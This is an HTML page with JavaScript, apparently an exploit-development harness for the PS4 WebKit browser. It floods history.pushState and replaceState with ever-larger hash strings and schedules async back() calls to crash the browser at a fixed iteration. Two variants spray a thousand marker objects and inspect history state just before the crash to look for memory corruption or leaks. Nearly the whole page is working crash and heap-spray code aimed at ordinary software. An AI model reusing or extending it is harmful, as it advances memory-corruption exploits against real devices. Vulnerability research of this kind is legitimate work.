<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit â€“ Exact Crash Observation</title>
<style>
body { font-family: monospace; padding: 20px; background: #000; color: #0f0; }
button { 
  display: block; 
  margin: 10px 0; 
  padding: 15px 25px; 
  background: #1a1a1a; 
  color: #0f0; 
  border: 2px solid #0f0;
  cursor: pointer;
  font-size: 16px;
  font-weight: bold;
}
button:hover { background: #2a2a2a; }
#log { 
  margin-top: 20px; 
  white-space: pre-wrap; 
  font-size: 12px;
  border: 1px solid #0f0;
  padding: 15px;
  background: #0a0a0a;
  max-height: 500px;
  overflow-y: auto;
}
.critical { color: #f00; font-weight: bold; }
.success { color: #0ff; }
.warn { color: #ff0; }
</style>
</head>
<body>
<h2>ðŸŽ¯ PS4 WebKit â€“ Exact Crash + Observation</h2>
<p style="color: #ff0;">Using EXACT crash conditions - NO modifications to core loop</p>

<button onclick="runExactCrash()">EXACT CRASH â€“ Original (will crash ITER 48)</button>
<button onclick="runWithPreCrashSpray()">SPRAY AT ITER 47 â€“ Observe before crash</button>
<button onclick="runWithStateObservation()">OBSERVE STATE â€“ Check history at ITER 47</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m, cls=""){ 
  const span = document.createElement("span");
  if(cls) span.className = cls;
  span.textContent = m + "\n";
  logEl.appendChild(span);
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;
const ITERS = 50;

let heap = [];
let sharedState = { i: 0, p: "" };
let spray = [];

// -------------------------------------------------
// EXACT CRASH â€“ No changes
// -------------------------------------------------
async function runExactCrash(){
  logEl.textContent = "";
  heap = [];
  sharedState = { i: 0, p: "" };
  
  log("=== EXACT CRASH â€“ BASELINE ===", "critical");
  log("Expected: Crash at ITER 48\n");
  
  let size = BASE;
  for(let i=0; i<ITERS; i++){
    sharedState.i = i;
    sharedState.p = "A".repeat(size);
    
    heap.push("G".repeat(32768));
    
    log(`[ITER ${i}] size=${size}`);
    
    history.pushState(sharedState, "", "#"+sharedState.p);
    history.replaceState(sharedState, "", "#"+sharedState.p);
    
    if(i % 6 === 0){
      setTimeout(()=>history.back(), 0);
      log("  â†’ async back() scheduled", "warn");
    }
    
    size += STEP;
    await sleep(3);
  }
  
  log("\n=== END (should not reach) ===");
}

// -------------------------------------------------
// SPRAY AT ITER 47 â€“ Before crash
// -------------------------------------------------
async function runWithPreCrashSpray(){
  logEl.textContent = "";
  heap = [];
  sharedState = { i: 0, p: "" };
  spray = [];
  
  log("=== SPRAY AT ITER 47 ===", "critical");
  log("Strategy: Create spray objects just before crash point\n");
  
  let size = BASE;
  for(let i=0; i<ITERS; i++){
    sharedState.i = i;
    sharedState.p = "A".repeat(size);
    
    heap.push("G".repeat(32768));
    
    log(`[ITER ${i}] size=${size}`);
    
    // SPRAY OBJECTS AT ITER 47 (before crash)
    if(i === 47){
      log("\n>>> SPRAYING 1000 OBJECTS <<<", "warn");
      const MARKER = "LEAK_MARKER_";
      for(let j=0; j<1000; j++){
        spray.push({
          id: j,
          marker: MARKER + j.toString(16).padStart(8, "0"),
          data: new Array(100).fill(j)
        });
      }
      log(`Spray complete: ${spray.length} objects\n`, "success");
    }
    
    history.pushState(sharedState, "", "#"+sharedState.p);
    history.replaceState(sharedState, "", "#"+sharedState.p);
    
    if(i % 6 === 0){
      setTimeout(()=>history.back(), 0);
      log("  â†’ async back() scheduled", "warn");
    }
    
    size += STEP;
    await sleep(3);
  }
  
  log("\n=== END (should not reach) ===");
}

// -------------------------------------------------
// OBSERVE STATE â€“ Check history at ITER 47
// -------------------------------------------------
async function runWithStateObservation(){
  logEl.textContent = "";
  heap = [];
  sharedState = { i: 0, p: "" };
  
  log("=== OBSERVE STATE AT ITER 47 ===", "critical");
  log("Strategy: Examine history state before crash\n");
  
  let size = BASE;
  for(let i=0; i<ITERS; i++){
    sharedState.i = i;
    sharedState.p = "A".repeat(size);
    
    heap.push("G".repeat(32768));
    
    log(`[ITER ${i}] size=${size}`);
    
    // OBSERVE AT ITER 47
    if(i === 47){
      log("\n>>> OBSERVING STATE <<<", "warn");
      log(`history.length: ${history.length}`);
      log(`location.hash.length: ${location.hash.length}`);
      log(`history.state: ${JSON.stringify(history.state)?.slice(0,80)}`, "success");
      log(`sharedState.i: ${sharedState.i}`);
      log(`sharedState.p.length: ${sharedState.p.length}`);
      log(`heap accumulated: ${(heap.length * 32).toFixed(0)} KB`);
      
      // Try to read some history entries
      log("\nAttempting to access history data:");
      try {
        const currentHash = location.hash;
        log(`  Current hash first 50 chars: ${currentHash.slice(0,50)}`, "success");
        log(`  Current hash last 50 chars: ${currentHash.slice(-50)}`, "success");
      } catch(e){
        log(`  Error reading hash: ${e.message}`, "critical");
      }
      log("");
    }
    
    history.pushState(sharedState, "", "#"+sharedState.p);
    history.replaceState(sharedState, "", "#"+sharedState.p);
    
    if(i % 6 === 0){
      setTimeout(()=>history.back(), 0);
      log("  â†’ async back() scheduled", "warn");
    }
    
    size += STEP;
    await sleep(3);
  }
  
  log("\n=== END (should not reach) ===");
}

log("Ready.");
log("All tests use EXACT crash conditions (BASE=977, STEP=14461, ITERS=50)");
log("Only difference: observation/spray at ITER 47 (before crash)");
log("\n1. EXACT CRASH - baseline confirmation");
log("2. SPRAY - detect if objects corrupt after crash");
log("3. OBSERVE - examine state before crash");
</script>
</body>
</html>
